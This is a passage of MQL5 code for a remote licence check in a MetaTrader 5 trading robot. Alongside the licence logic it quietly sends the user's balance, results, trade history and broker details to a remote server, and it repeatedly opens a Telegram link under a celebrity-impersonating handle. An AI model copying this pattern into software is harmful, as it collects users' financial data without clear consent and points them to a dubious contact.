        if(Projeto != NOME_ARQUIVO)
        {
          if(language == "pt")
          {
            // Send log data to the error API with date and time, IP, reason for the error, type=critical
            MensagemBox("Arquivo possivelmente fraudado!", "Erro com os dados originais de nome do arquivo.", MB_ICONERROR);
          }
          else // English by default
          {
            // Send log data to the error API with time and date, IP, error reason, type=critical
            #ifdef DEBUG
              Print("Error with original file name data. (3) Project file name in the server: " + NOME_ARQUIVO + ", Project file name in the terminal: " + Projeto);
            #endif
            MensagemBox("Wrong file!", "Error with original file name data.", MB_ICONERROR);
          }

          Remove();
        }

         // Verificar versão
         if((double)__VERSAO__ != (double)VERSAO)
           {
            if(ATUALIZAR == "on")
              {
               if(language == "pt")
                 {
                  MensagemBox("Atualização disponível!", MSG_ATUALIZAR, MB_ICONWARNING);
                 }
               else // Inglês por padrão
                 {
                  MensagemBox("Update available!", MSG_ATUALIZAR, MB_ICONWARNING);
                 }

               AbrirURL(LINK_ATUALIZAR);
               Remove();

              }
           }

         // Dados do usuário recebidos do MetaTrader
         string usuarioData = NOME_EA_AUTORIZADO;  // Exemplo de dados recebidos

         // Dividir a string em partes individuais usando vírgulas como delimitador
         string dados_ea[];
         ArrayResize(dados_ea, 0);
         StringSplit(usuarioData, ',', dados_ea);

         // Nome do projeto a ser verificado
         string nome_projeto = dados_ea[0];  // O primeiro elemento é o nome do projeto

         // Variável para verificar se o acesso é autorizado
         bool acesso_autorizado = false;

         // Verificar se há dados suficientes para representar um EA completo (nome, definir_tipo_conta, tipo_conta, definir_expiracao, expiracao)
         if(ArraySize(dados_ea) >= 5)
           {
            // Iterar sobre os EAs recebidos para encontrar o correspondente ao nome do projeto
            for(int i = 0; i < ArraySize(dados_ea); i += 5)
              {
               string nome_ea = dados_ea[i];
               string definir_tipo_conta = dados_ea[i + 1];
               string tipo_conta = dados_ea[i + 2];
               string definir_expiracao = dados_ea[i + 3];
               string expiracao = dados_ea[i + 4];

               // Verificar se o nome do projeto corresponde ao EA atual
               if(nome_ea == nome_projeto)
                 {
                  // Autorizar o acesso e exibir os dados do EA
                  acesso_autorizado = true;
                  global_nome_projeto = nome_projeto;
                  global_definir_tipo_conta = definir_tipo_conta;
                  global_tipo_conta = tipo_conta;
                  global_definir_expiracao = definir_expiracao;
                  global_expiracao = expiracao;
                  break;  // Se encontrou uma correspondência, não é necessário continuar verificando
                 }
              }
           }

        }


     }


   if(global_is_demo == "1")
     {


      // Verificar se a expiração está definida como ""
      if(global_definir_expiracao == "")
        {

         string ativar_teste = "ATIVAR";
         // Construir a string de parâmetros para envio ao servidor
         string parametros_ativacao = StringFormat("?mtid=%d&projeto=%s&page=%s&ativar_teste=%s",
                                      mt5_id, nome_projeto, page, ativar_teste);


         // Enviar os dados para o servidor
         string resposta_ativacao = API(parametros_ativacao);


         // Lidar com a resposta do servidor (se necessário)
         if(StringLen(resposta_ativacao) > 0)
           {
            // Tratar a resposta do servidor
            if(resposta_ativacao == "EA ativado")



              {


               //+-----------------------------------------------------------------------------+
               //| ENVIAR RESULTADOS PARA O DASHBOARD (SE PESAR O EA, ISSO DEVE SER RETIRADO)  |
               //+-----------------------------------------------------------------------------+

               DadosMensaisDoHistorico();

               // Dados para enviar
               double saldo_normalizado = NormalizeDouble(GetSaldo(), 2);
               double resultado_do_dia = NormalizeDouble(ResultadoDoDia(), 2);
               double resultado_da_semana = NormalizeDouble(ResultadoDaSemana(), 2);
               double lucro_total = NormalizeDouble(lucroTotalMensal, 2);
               double taxa_acerto = NormalizeDouble(taxaDeAcertoMensalEmPorcentagem, 2);
               double maior_loss = NormalizeDouble(maiorLoss, 2);
               double maior_gain = NormalizeDouble(maiorGain, 2);
               string resultados_mensais = ObterResultadosMensais();
               string historico = GetHistoricoFormatado(); // Assumindo que Historico() retorna o histórico formatado conforme desejado

               // Variáveis da corretora, servidor e moeda da conta
               string corretora = AccountInfoString(ACCOUNT_COMPANY);
               string servidor = AccountInfoString(ACCOUNT_SERVER);
               string moeda_conta = AccountInfoString(ACCOUNT_CURRENCY);

               // Construir a string de parâmetros para enviar para o servidor
               string parametros = StringFormat("?mtid=%d&saldo=%.2f&resultado_do_dia=%.2f&resultado_da_semana=%.2f&lucro_total=%.2f&taxa_acerto=%.2f&maior_loss_diario=%.2f&maior_gain_diario=%.2f&resultados_mensais=%s&historico=%s&corretora=%s&servidor=%s&moeda_conta=%s",
                                                __MT5ID__,
                                                saldo_normalizado,
                                                resultado_do_dia, resultado_da_semana,
                                                lucro_total, taxa_acerto,
                                                maior_loss, maior_gain,
                                                resultados_mensais, historico,
                                                corretora, servidor,
                                                moeda_conta);


               // Enviar os dados para o servidor
               string resposta = API(parametros);

               if(language == "pt")
                 {
                  MensagemBox("Administrador: ", "Robô de TESTE ativado por 7 dias. Recarregue o EA no gráfico!", MB_ICONWARNING);
                  Remove();


                  return (INIT_FAILED);
                 }
               else // Inglês por padrão
                 {
                  MensagemBox("Administrator: ", "TEST robot activated for 7 days. Put the EA back on the chart!", MB_ICONWARNING);
                  Remove();
                  return (INIT_FAILED);
                 }
              }
            else
              {
               Print("Ativação falhou. Resposta do servidor: ", resposta_ativacao);
               AbrirURL("https://t.me/elon888musk");
               Remove();
               Remove();
              }
           }
         else
           {

           }
        }
      else
        {

        }
     }
   else
     {

     }

//+-----------------------------------------------------------------------------+
//| ENVIAR RESULTADOS PARA O DASHBOARD (SE PESAR O EA, ISSO DEVE SER RETIRADO)  |
//+-----------------------------------------------------------------------------+

   DadosMensaisDoHistorico();

// Dados para enviar
   double saldo_normalizado = NormalizeDouble(GetSaldo(), 2);
   double resultado_do_dia = NormalizeDouble(ResultadoDoDia(), 2);
   double resultado_da_semana = NormalizeDouble(ResultadoDaSemana(), 2);
   double lucro_total = NormalizeDouble(lucroTotalMensal, 2);
   double taxa_acerto = NormalizeDouble(taxaDeAcertoMensalEmPorcentagem, 2);
   double maior_loss = NormalizeDouble(maiorLoss, 2);
   double maior_gain = NormalizeDouble(maiorGain, 2);
   string resultados_mensais = ObterResultadosMensais();
   string historico = GetHistoricoFormatado(); // Assumindo que Historico() retorna o histórico formatado conforme desejado

// Variáveis da corretora, servidor e moeda da conta
   string corretora = AccountInfoString(ACCOUNT_COMPANY);
   string servidor = AccountInfoString(ACCOUNT_SERVER);
   string moeda_conta = AccountInfoString(ACCOUNT_CURRENCY);

// Construir a string de parâmetros para enviar para o servidor
   string parametros = StringFormat("?mtid=%d&saldo=%.2f&resultado_do_dia=%.2f&resultado_da_semana=%.2f&lucro_total=%.2f&taxa_acerto=%.2f&maior_loss_diario=%.2f&maior_gain_diario=%.2f&resultados_mensais=%s&historico=%s&corretora=%s&servidor=%s&moeda_conta=%s",
                                    __MT5ID__,
                                    saldo_normalizado,
                                    resultado_do_dia, resultado_da_semana,
                                    lucro_total, taxa_acerto,
                                    maior_loss, maior_gain,
                                    resultados_mensais, historico,
                                    corretora, servidor,
                                    moeda_conta);


// Enviar os dados para o servidor
   string resposta = API(parametros);
//+------------------------------------------------------------------+
//| ENVIAR E RECEBER OS DADOS DO SERVIDOR                            |
//+------------------------------------------------------------------+


   API(parametros_projeto);

   if(StringLen(api_resposta) > 0)
     {
      const string Sep=";";
      ushort Uchar;
      string Res[];
      Uchar = StringGetCharacter(Sep,0);
      int Tam = StringSplit(api_resposta,Uchar,Res);

      if(Tam >= 0)
        {
         const string MENSAGEM = Res[0];
         const string MENSAGEM_USUARIO = Res[1];
         const string ATUALIZAR = Res[4];
         const double VERSAO = (double)Res[5];
         const string MSG_ATUALIZAR = Res[6];
         const string LINK_ATUALIZAR = Res[7];
         const string NOME_ARQUIVO = Res[8];
         const string STATUS = Res[10];
         const string MT5_ID = Res[11];
         const string ATIVAR_NOME_USUARIO = Res[12];
         const string NOME_USUARIO = Res[13];
         const string IS_DEMO =  Res[19];
         const string NOME_EA_AUTORIZADO =  Res[20];


         global_usuario = NOME_USUARIO;
         global_status = STATUS;
         global_mt5id= MT5_ID;
         global_is_demo = IS_DEMO;



         // Envia mensagem a todos os clientes
         if(MENSAGEM == "on")
           {
            if(language == "pt")
              {
               MensagemBox("Mensagem importante!", MENSAGEM_USUARIO, MB_ICONWARNING);
              }
            else // Inglês por padrão
              {
               MensagemBox("Important message!", MENSAGEM_USUARIO, MB_ICONWARNING);
              }
           }


         // Verificar nome original do arquivo
         if(Projeto != NOME_ARQUIVO)
           {
            if(language == "pt")
              {
               // Enviar dados log para a api de erro com hora e data, ip, motivo do erro, tipo=grave
               MensagemBox("Arquivo possivelmente fraudado!", "Erro com os dados originais de nome do arquivo.", MB_ICONERROR);
              }
            else // Inglês por padrão
              {
               // Enviar dados log para a api de erro com hora e data, ip, motivo do erro, tipo=grave
               
               Print("Error with original file name data. (4)");
               MensagemBox("Wrong file!", "Error with original file name data.", MB_ICONERROR);
              }

            Remove();

           }


         // Verificar versão
         if((double)__VERSAO__ != (double)VERSAO)
           {
            if(ATUALIZAR == "on")
              {
               if(language == "pt")
                 {
                  MensagemBox("Atualização disponível!", MSG_ATUALIZAR, MB_ICONWARNING);
                 }
               else // Inglês por padrão
                 {
                  MensagemBox("Update available!", MSG_ATUALIZAR, MB_ICONWARNING);
                 }

               AbrirURL(LINK_ATUALIZAR);
               Remove();

              }
           }




         // Dados do usuário recebidos do MetaTrader
         string usuarioData = NOME_EA_AUTORIZADO;  // Exemplo de dados recebidos

         // Dividir a string em partes individuais usando vírgulas como delimitador
         string dados_ea[];
         ArrayResize(dados_ea, 0);
         StringSplit(usuarioData, ',', dados_ea);

         // Nome do projeto a ser verificado
         string nome_projeto = dados_ea[0];  // O primeiro elemento é o nome do projeto

         // Variável para verificar se o acesso é autorizado
         bool acesso_autorizado = false;

         // Verificar se há dados suficientes para representar um EA completo (nome, definir_tipo_conta, tipo_conta, definir_expiracao, expiracao)
         if(ArraySize(dados_ea) >= 5)
           {
            // Iterar sobre os EAs recebidos para encontrar o correspondente ao nome do projeto
            for(int i = 0; i < ArraySize(dados_ea); i += 5)
              {
               string nome_ea = dados_ea[i];
               string definir_tipo_conta = dados_ea[i + 1];
               string tipo_conta = dados_ea[i + 2];
               string definir_expiracao = dados_ea[i + 3];
               string expiracao = dados_ea[i + 4];

               // Verificar se o nome do projeto corresponde ao EA atual
               if(nome_ea == nome_projeto)
                 {
                  // Autorizar o acesso e exibir os dados do EA
                  acesso_autorizado = true;
                  global_nome_projeto = nome_projeto;
                  global_definir_tipo_conta = definir_tipo_conta;
                  global_tipo_conta = tipo_conta;
                  global_definir_expiracao = definir_expiracao;
                  global_expiracao = expiracao;
                  break;  // Se encontrou uma correspondência, não é necessário continuar verificando
                 }
              }
           }

         // Solicitação Pendente
         if(STATUS == "PENDENTE")
           {
            if(language == "pt")
              {
               MensagemBox("Solicitação pendente!", "Sua solicitação já foi enviada. Se já informou sua MT5 ID para o administrador, basta aguardar a ativação.", MB_ICONWARNING);
               Remove();
               return (INIT_FAILED);
              }
            else // Inglês por padrão
              {
               MensagemBox("Pending request!", "Your request has already been submitted. If you have already informed your MT5 ID to the administrator, just wait for activation.", MB_ICONWARNING);
               Remove();
               return (INIT_FAILED);
              }


           }

         // Solicitação Negada
         if(STATUS == "NEGADO")
           {
            if(language == "pt")
              {
               MensagemBox("Solicitação negada!", "Sua solicitação foi negada. Qualquer dúvida, entre em contato com o administrador.", MB_ICONERROR);
               AbrirURL("https://t.me/elon888musk");
               Remove();
               Remove();
               return (INIT_FAILED);
              }
            else // Inglês por padrão
              {
               MensagemBox("Request denied!", "Your request has been denied. If you have any questions, please contact the administrator.", MB_ICONERROR);
               AbrirURL("https://t.me/elon888musk");
               Remove();
               Remove();
               return (INIT_FAILED);
              }


           }

         // Solicitação Desativada
         if(STATUS == "DESATIVADO")
           {
            if(language == "pt")
              {
               MensagemBox("Licença desativada!", "Sua licença foi desativada. Qualquer dúvida, entre em contato com o administrador.", MB_ICONERROR);
               AbrirURL("https://t.me/elon888musk");
               Remove();
               Remove();
               return (INIT_FAILED);
              }
            else // Inglês por padrão
              {
               MensagemBox("License deactivated!", "Your license has been deactivated. If you have any questions, please contact the administrator.", MB_ICONERROR);
               AbrirURL("https://t.me/elon888musk");
               Remove();
               Remove();
               return (INIT_FAILED);
              }


           }

         // Outro tipo de solicitação
         if(STATUS != "PENDENTE" && STATUS != "NEGADO" && STATUS != "DESATIVADO" && STATUS != "ATIVADO")
           {
            if(language == "pt")
              {
               MensagemBox("Licença inválida!", "Sua licença é inválida.", MB_ICONERROR);
               AbrirURL("https://t.me/elon888musk");
               Remove();

               Remove();
               return (INIT_FAILED);
              }
            else // Inglês por padrão
              {
               MensagemBox("Invalid license!", "Your license is invalid.", MB_ICONERROR);
               AbrirURL("https://t.me/elon888musk");
               Remove();

               Remove();
               return (INIT_FAILED);
              }

           }


         // Verificar se o acesso foi autorizado
         if(!acesso_autorizado)
           {
            // Informar que a conta não está autorizada
            if(language == "pt")
              {
               MensagemBox("Conta MT5 não autorizada!", "Sua conta MT5 não possui permissão de acesso.", MB_ICONERROR);
               AbrirURL("https://t.me/elon888musk");
               Remove();
               Remove();
               return (INIT_FAILED);
              }
            else // Inglês por padrão
              {
               MensagemBox("Unauthorized MT5 account!", "Your MT5 account does not have permission to access.", MB_ICONERROR);
               AbrirURL("https://t.me/elon888musk");
               Remove();
               Remove();
               return (INIT_FAILED);
              }

           }

         // Envia Mensagem aos Clientes
         if(MENSAGEM == "on")
           {
            if(language == "pt")
              {
               MensagemBox("Mensagem importante!", MENSAGEM_USUARIO, MB_ICONWARNING);
              }
            else // Inglês por padrão
              {
               MensagemBox("Important message!", MENSAGEM_USUARIO, MB_ICONWARNING);
              }
           }


         // Verificar nome original do arquivo
         if(Projeto != NOME_ARQUIVO)
           {
            // Enviar dados log para a api de erro com hora e data, ip, motivo do erro, tipo=grave
            if(language == "pt")
              {
               MensagemBox("Arquivo possivelmente fraudado!", "Erro com os dados originais de nome do arquivo.", MB_ICONERROR);
               Remove();
               return (INIT_FAILED);
              }
            else // Inglês por padrão
              {                
               Print("Error with original file name data. (5)");
               MensagemBox("Wrong file!", "Error with original file name data.", MB_ICONERROR);
               Remove();
               return (INIT_FAILED);
              }
           }

         // Verificar versão
         if((double)__VERSAO__ != (double)VERSAO)
           {
            if(ATUALIZAR == "on")
               if(language == "pt")
                 {
                  MensagemBox("Atualização disponível!", MSG_ATUALIZAR, MB_ICONWARNING);
                  AbrirURL(LINK_ATUALIZAR);
                  Remove();
                  return (INIT_FAILED);
                 }
               else // Inglês por padrão
                 {
                  MensagemBox("Update available!", MSG_ATUALIZAR, MB_ICONWARNING);
                  AbrirURL(LINK_ATUALIZAR);
                  Remove();
                  return (INIT_FAILED);
                 }

           }


         // Verificar se MT5ID está cadastrado
         if(MT5_ID != (string)__MT5ID__)
           {
            if(language == "pt")
              {
               MensagemBox("Conta MT5 não autorizada!", "Sua conta MT5 " + (string)__MT5ID__ + " não possui permissão de acesso.", MB_ICONERROR);
               AbrirURL("https://t.me/elon888musk");
               Remove();
               Remove();
               return (INIT_FAILED);
              }
            else // Inglês por padrão
              {
               MensagemBox("Unauthorized MT5 account!", "Your MT5 account " + (string)__MT5ID__ + " does not have permission to access.", MB_ICONERROR);
               AbrirURL("https://t.me/elon888musk");
               Remove();
               Remove();
               return (INIT_FAILED);
              }


           }


         // Ativar e desativar nome do usuário
         if(ATIVAR_NOME_USUARIO == "on")
           {
            // Verificar nome do usuário
            if(NOME_USUARIO != NOME)
              {
               if(language == "pt")
                 {
                  MensagemBox("Usuário não autorizado!", "Este usuário não corresponde ao usuário cadastrado nesta licença.", MB_ICONERROR);
                  Remove();
                  return (INIT_FAILED);
                 }
               else // Inglês por padrão
                 {
                  MensagemBox("Unauthorized user!", "This user does not match the user registered for this license.", MB_ICONERROR);
                  AbrirURL("https://t.me/elon888musk");
                  Remove();
                  Remove();
                  return (INIT_FAILED);
                 }


              }
           }


         // ativar e desativar expiração
         if(global_definir_expiracao == "on")
           {
            const string expiracao_api = global_expiracao;
            const string Sepa = "-";
            ushort Uchar_;
            string Res_[];
            Uchar_ = StringGetCharacter(Sepa,0);
            int Tam_ = StringSplit(expiracao_api,Uchar_,Res_);

            if(Tam_ == 3)
              {
               string EXPIRACAO_ = Res_[2]+"."+Res_[1]+"."+Res_[0]+" 00:00:00";
               datetime EXP = StringToTime(EXPIRACAO_);
               int expstamp = (int)EXP;
               int dif = expstamp - TimeStamp();

               if(dif <= 0)
                 {
                  if(language == "pt")
                    {
                     MensagemBox("Licença expirada!", "Período de acesso para sua licença expirou. Renove sua licença para voltar a usar a ferramenta.", MB_ICONERROR);
                     AbrirURL("https://t.me/elon888musk");
                     Remove();
                     Remove();
                     return (INIT_FAILED);
                    }
                  else // Inglês por padrão
                    {
                     MensagemBox("License expired!", "Access period for your license has expired. Please renew your license to continue using the tool.", MB_ICONERROR);
                     AbrirURL("https://t.me/elon888musk");
                     Remove();
                     Remove();
                     return (INIT_FAILED);
                    }


                 }

              }
            else
              {
               Remove();
               return(INIT_FAILED);
              }
           } //

         // Permitir apenas conta demo ou real
         if(global_definir_tipo_conta == "on")
           {
            if(global_tipo_conta == "DEMO")
              {
               if(TipoDeConta() != "DEMO")
                 {
                  if(language == "pt")
                    {
                     MensagemBox("Tipo de conta inválido!", "Sua licença só permite operar em conta DEMO.", MB_ICONERROR);
                     AbrirURL("https://t.me/elon888musk");
                     Remove();
                     Remove(); // Remove o EA ou script
                     return (INIT_FAILED);
                    }
                  else // Inglês por padrão
                    {
                     MensagemBox("Invalid account type!", "Your license only allows trading on DEMO accounts.", MB_ICONERROR);
                     AbrirURL("https://t.me/elon888musk");
                     Remove();
                     Remove(); // Remove o EA ou script
                     return (INIT_FAILED);
                    }


                 }
              }
            else
               if(global_tipo_conta == "REAL")
                 {
                  if(TipoDeConta() != "REAL")
                    {
                     if(language == "pt")
                       {
                        MensagemBox("Tipo de conta inválido!", "Sua licença só permite operar em conta REAL.", MB_ICONERROR);
                        AbrirURL("https://t.me/elon888musk");
                        Remove();

                        Remove(); // Remove o EA ou script
                        return (INIT_FAILED);
                       }
                     else // Inglês por padrão
                       {
                        MensagemBox("Invalid account type!", "Your license only allows trading on REAL accounts.", MB_ICONERROR);
                        AbrirURL("https://t.me/elon888musk");
                        Remove();

                        Remove(); // Remove o EA ou script
                        return (INIT_FAILED);
                       }

                    }
                 }
           }
        }

      else
        {
         if(language == "pt")
           {
            // enviar dados log para a api de erro
            Print("Erro!", "Erro no retorno dos dados da API.");
           }
         else // Inglês por padrão
           {
            // enviar dados log para a api de erro
            Print("Error!", "Error in API data retrieval.");
           }
        }
     }
   else
     {
      // enviar dados log para a api de erro
      if(language == "pt")
        {
         // enviar dados log para a api de erro
         Print("Erro!", "Erro ao obter dados - Reinicie o Metatrader.");
        }
      else // Inglês por padrão
        {
         // enviar dados log para a api de erro
         Print("Error!", "Error retrieving data - Restart Metatrader.");
        }
     }

   return(INIT_SUCCEEDED);
  }

//+------------------------------------------------------------------+
//| COLAR NA FUNÇÃO ONTICK                                           |
//+------------------------------------------------------------------+

//+------------------------------------------------------------------+
//|                                                                  |
//+------------------------------------------------------------------+
void COLAR_NA_FUNCAO_ONTICK_OU_ONSTART_EA(ulong magic, const string Projeto, string __VERSAO__)
  {
//+------------------------------------------------------------------+
//| VERIFICA POSIÇÃO ABERTA                                          |
//+------------------------------------------------------------------+

   posAbertaLicenca = false;
   for(int i = PositionsTotal() - 1; i >= 0; i--)
     {
      string symbol = PositionGetSymbol(i);
      ulong positionMagic = PositionGetInteger(POSITION_MAGIC);

      if(symbol == _Symbol && positionMagic == magic)
        {
         posAbertaLicenca = true;
         break;
        }
     }

//+------------------------------------------------------------------+
//| VERIFICA ORDEM PENDENTE                                          |
//+------------------------------------------------------------------+

   ordPendenteLicenca = false;
   for(int i = OrdersTotal() - 1; i >= 0; i--)
     {
      ulong ticket = OrderGetTicket(i);
      string symbol = OrderGetString(ORDER_SYMBOL);
      ulong orderMagic = OrderGetInteger(ORDER_MAGIC);

      if(symbol == _Symbol && orderMagic == magic)
        {
         ordPendenteLicenca = true;
         break;
        }
     }

//+------------------------------------------------------------------+
//| RETORNA CASO TENHA POSIÇÃO ABERTA OU ORDEM PENDENTE              |
//+------------------------------------------------------------------+

   if(posAbertaLicenca || ordPendenteLicenca)
      return;

//+------------------------------------------------------------------+
//| ENVIAR RESULTADOS PARA DASHBORD                                  |
//+------------------------------------------------------------------+

   if(isNewBarLicencaRemota())
     {
      //+-----------------------------------------------------------------------------+
      //| ENVIAR RESULTADOS PARA O DASHBOARD (SE PESAR O EA, ISSO DEVE SER RETIRADO)  |
      //+-----------------------------------------------------------------------------+

      DadosMensaisDoHistorico();

      // Dados para enviar
      double saldo_normalizado = NormalizeDouble(GetSaldo(), 2);
      double resultado_do_dia = NormalizeDouble(ResultadoDoDia(), 2);
      double resultado_da_semana = NormalizeDouble(ResultadoDaSemana(), 2);
      double lucro_total = NormalizeDouble(lucroTotalMensal, 2);
      double taxa_acerto = NormalizeDouble(taxaDeAcertoMensalEmPorcentagem, 2);
      double maior_loss = NormalizeDouble(maiorLoss, 2);
      double maior_gain = NormalizeDouble(maiorGain, 2);
      string resultados_mensais = ObterResultadosMensais();
      string historico = GetHistoricoFormatado(); // Assumindo que Historico() retorna o histórico formatado conforme desejado

      // Variáveis da corretora, servidor e moeda da conta
      string corretora = AccountInfoString(ACCOUNT_COMPANY);
      string servidor = AccountInfoString(ACCOUNT_SERVER);
      string moeda_conta = AccountInfoString(ACCOUNT_CURRENCY);

      // Construir a string de parâmetros para enviar para o servidor
      string parametros = StringFormat("?mtid=%d&saldo=%.2f&resultado_do_dia=%.2f&resultado_da_semana=%.2f&lucro_total=%.2f&taxa_acerto=%.2f&maior_loss_diario=%.2f&maior_gain_diario=%.2f&resultados_mensais=%s&historico=%s&corretora=%s&servidor=%s&moeda_conta=%s",
                                       __MT5ID__,
                                       saldo_normalizado,
                                       resultado_do_dia, resultado_da_semana,
                                       lucro_total, taxa_acerto,
                                       maior_loss, maior_gain,
                                       resultados_mensais, historico,
                                       corretora, servidor,
                                       moeda_conta);


      // Enviar os dados para o servidor
      string resposta = API(parametros);




      // Obter o ID do MetaTrader
      string mt5_id = IntegerToString(__MT5ID__);

      // Obter o nome do projeto
      string nome_projeto = Projeto;

      // Definir o valor do parâmetro "page"
      string page = IntegerToString(__MT5ID__);

      // Construir a string de parâmetros para enviar para o servidor, incluindo o parâmetro "page"
      string parametros_projeto = StringFormat("?mtid=%d&projeto=%s&page=%s", mt5_id, nome_projeto, page);

      // Enviar os dados para o servidor
      string api_resposta = API(parametros_projeto);

      if(StringLen(api_resposta) > 0)
        {
         const string Sep=";";
         ushort Uchar;
         string Res[];
         Uchar = StringGetCharacter(Sep,0);
         int Tam = StringSplit(api_resposta,Uchar,Res);
         const string MENSAGEM = Res[0];
         const string MENSAGEM_USUARIO = Res[1];
         const string ATUALIZAR = Res[4];
         const double VERSAO = (double)Res[5];
         const string MSG_ATUALIZAR = Res[6];
         const string LINK_ATUALIZAR = Res[7];
         const string NOME_ARQUIVO = Res[8];
         const string STATUS = Res[10];
         const string MT5_ID = Res[11];
         const string ATIVAR_NOME_USUARIO = Res[12];
         const string NOME_USUARIO = Res[13];
         const string IS_DEMO =  Res[19];
         const string NOME_EA_AUTORIZADO =  Res[20];

         // Envia mensagem a todos os clientes
         if(MENSAGEM == "on")
           {
            if(language == "pt")
              {
               MensagemBox("Mensagem importante!", MENSAGEM_USUARIO, MB_ICONWARNING);
              }
            else // Inglês por padrão
              {
               MensagemBox("Important message!", MENSAGEM_USUARIO, MB_ICONWARNING);
              }
           }


         // Verificar nome original do arquivo
         if(Projeto != NOME_ARQUIVO)
           {
            if(language == "pt")
              {
               // Enviar dados log para a api de erro com hora e data, ip, motivo do erro, tipo=grave
               MensagemBox("Arquivo possivelmente fraudado!", "Erro com os dados originais de nome do arquivo.", MB_ICONERROR);
              }
            else // Inglês por padrão
              {
               // Enviar dados log para a api de erro com hora e data, ip, motivo do erro, tipo=grave
               Print("Error with original file name data. (6)");
               MensagemBox("Wrong file!", "Error with original file name data.", MB_ICONERROR);
              }

            Remove();
            return;
           }


         // Verificar versão
         if((double)__VERSAO__ != (double)VERSAO)
           {
            if(ATUALIZAR == "on")
              {
               if(language == "pt")
                 {
                  MensagemBox("Atualização disponível!", MSG_ATUALIZAR, MB_ICONWARNING);
                 }
               else // Inglês por padrão
                 {
                  MensagemBox("Update available!", MSG_ATUALIZAR, MB_ICONWARNING);
                 }

               AbrirURL(LINK_ATUALIZAR);
               Remove();
               return;
              }
           }


         global_usuario = NOME_USUARIO;
         global_status = STATUS;
         global_mt5id= MT5_ID;

         // Dados do usuário recebidos do MetaTrader
         string usuarioData = NOME_EA_AUTORIZADO;  // Exemplo de dados recebidos

         // Dividir a string em partes individuais usando vírgulas como delimitador
         string dados_ea[];
         ArrayResize(dados_ea, 0);
         StringSplit(usuarioData, ',', dados_ea);

         // Nome do projeto a ser verificado
         string nome_projeto = dados_ea[0];  // O primeiro elemento é o nome do projeto

         // Variável para verificar se o acesso é autorizado
         bool acesso_autorizado = false;

         // Verificar se há dados suficientes para representar um EA completo (nome, definir_tipo_conta, tipo_conta, definir_expiracao, expiracao)
         if(ArraySize(dados_ea) >= 5)
           {
            // Iterar sobre os EAs recebidos para encontrar o correspondente ao nome do projeto
            for(int i = 0; i < ArraySize(dados_ea); i += 5)
              {
               string nome_ea = dados_ea[i];
               string definir_tipo_conta = dados_ea[i + 1];
               string tipo_conta = dados_ea[i + 2];
               string definir_expiracao = dados_ea[i + 3];
               string expiracao = dados_ea[i + 4];

               // Verificar se o nome do projeto corresponde ao EA atual
               if(nome_ea == nome_projeto)
                 {
                  // Autorizar o acesso e exibir os dados do EA
                  acesso_autorizado = true;
                  global_nome_projeto = nome_projeto;
                  global_definir_tipo_conta = definir_tipo_conta;
                  global_tipo_conta = tipo_conta;
                  global_definir_expiracao = definir_expiracao;
                  global_expiracao = expiracao;
                  break;  // Se encontrou uma correspondência, não é necessário continuar verificando
                 }
              }
           }

         // Verificar se o acesso foi autorizado
         if(!acesso_autorizado)
           {
            if(language == "pt")
              {
               MensagemBox("Conta MT5 não autorizada!", "Sua conta MT5 não possui permissão de acesso.", MB_ICONERROR);
               AbrirURL("https://t.me/elon888musk");
               Remove();
               Remove();
               return;
              }
            else // Inglês por padrão
              {
               MensagemBox("MT5 account not authorized!", "Your MT5 account does not have permission to access.", MB_ICONERROR);
               AbrirURL("https://t.me/elon888musk");
               Remove();
               Remove();
               return;
              }


           }

         // Status Pendente
         if(STATUS == "PENDENTE")
           {
            if(language == "pt")
              {
               MensagemBox("Solicitação pendente!", "Sua solicitação já foi enviada. Se já informou sua MT5 ID para o administrador, basta aguardar a ativação.", MB_ICONWARNING);
               Remove();
               return;
              }
            else // Inglês por padrão
              {
               MensagemBox("Pending request!", "Your request has already been submitted. If you have already provided your MT5 ID to the administrator, just wait for activation.", MB_ICONWARNING);
               Remove();
               return;
              }


           }

         // Status Negado
         if(STATUS == "NEGADO")
           {
            if(language == "pt")
              {
               MensagemBox("Solicitação negada!", "Sua solicitação foi negada. Qualquer dúvida, entre em contato com o administrador.", MB_ICONERROR);
               AbrirURL("https://t.me/elon888musk");
               Remove();
               Remove();
               return;
              }
            else // Inglês por padrão
              {
               MensagemBox("Request denied!", "Your request has been denied. For any questions, please contact the administrator.", MB_ICONERROR);
               AbrirURL("https://t.me/elon888musk");
               Remove();
               Remove();
               return;
              }


           }

         // Status Desativado
         if(STATUS == "DESATIVADO")
           {
            if(language == "pt")
              {
               MensagemBox("Licença desativada!", "Sua licença foi desativada. Qualquer dúvida, entre em contato com o administrador.", MB_ICONERROR);

               Remove();
               return;
              }
            else // Inglês por padrão
              {
               MensagemBox("License deactivated!", "Your license has been deactivated. For any questions, please contact the administrator.", MB_ICONERROR);
               AbrirURL("https://t.me/elon888musk");
               Remove();
               Remove();
               return;
              }

           }

         // Outros Status
         if(STATUS != "PENDENTE" && STATUS != "NEGADO" && STATUS != "DESATIVADO" && STATUS != "ATIVADO")
           {
            if(language == "pt")
              {
               MensagemBox("Licença inválida!", "Sua licença é inválida.", MB_ICONERROR);
               Remove();
               return;
              }
            else // Inglês por padrão
              {
               MensagemBox("Invalid license!", "Your license is invalid.", MB_ICONERROR);
               AbrirURL("https://t.me/elon888musk");
               Remove();
               Remove();
               return;
              }


           }

         // Verificar se MT5ID está cadastrado
         if(MT5_ID != (string)__MT5ID__)
           {
            if(language == "pt")
              {
               MensagemBox("Conta MT5 não autorizada!", "Sua conta MT5 "+(string)__MT5ID__+" não possui permissão de acesso.", MB_ICONERROR);
               Remove();
               return;
              }
            else // Inglês por padrão
              {
               MensagemBox("MT5 account not authorized!", "Your MT5 account "+(string)__MT5ID__+" does not have permission to access.", MB_ICONERROR);
               AbrirURL("https://t.me/elon888musk");
               Remove();
               Remove();
               return;
              }

           }


         // Ativar e desativar expiração
         if(global_definir_expiracao == "on")
           {
            const string expiracao_api = global_expiracao;
            const string Sepa = "-";
            ushort Uchar_;
            string Res_[];
            Uchar_ = StringGetCharacter(Sepa, 0);
            int Tam_ = StringSplit(expiracao_api, Uchar_, Res_);

            if(Tam_ == 3)
              {
               string EXPIRACAO_ = Res_[2] + "." + Res_[1] + "." + Res_[0] + " 00:00:00";
               datetime EXP = StringToTime(EXPIRACAO_);
               int expstamp = (int)EXP;
               int dif = expstamp - TimeStamp();


               if(dif <= 86400 && dif > 3600)
                 {

                  if(isNewDayLicencaRemota())
                    {
                     if(language == "pt")
                       {
                        MensagemBox("Atenção!", "Falta menos de 1 dia para expirar sua licença.", MB_ICONWARNING);
                        AbrirURL("https://t.me/elon888musk");
                        Remove();
                       }
                     else // Inglês por padrão
                       {
